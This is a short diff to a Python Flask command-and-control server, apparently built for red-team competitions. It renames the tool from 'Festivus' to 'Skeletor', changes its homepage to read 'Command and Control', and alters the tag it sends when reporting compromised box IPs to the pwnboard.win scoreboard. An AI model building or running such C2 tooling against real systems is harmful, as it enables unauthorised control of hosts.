@@ -67,7 +67,7 @@ def restrict_remote(func): # Decorator to restrict routes to localhost only
 
 def update_pwnboard(ip):
     try:
-        data = {'ip': ip, 'type': "festivus"}
+        data = {'ip': ip, 'type': "skeletor"}
         req = requests.post("https://pwnboard.win/pwn/boxaccess", json=data, timeout=3)
     except:
         pass
@@ -265,8 +265,8 @@ def make_task():
 @app.route('/', methods=['GET'])
 def homepage():
     webpage_content = """
-    <h1>Welcome to Festivus</h1>
-    <h3>A Festivus for the rest of us</h3>
+    <h1>Welcome to Skeletor</h1>
+    <h3>Command and Control</h3>
     """
     for agent in Agent.query.all():
         webpage_content += f"<p>{agent.agent_id} - {agent.status}</p>"
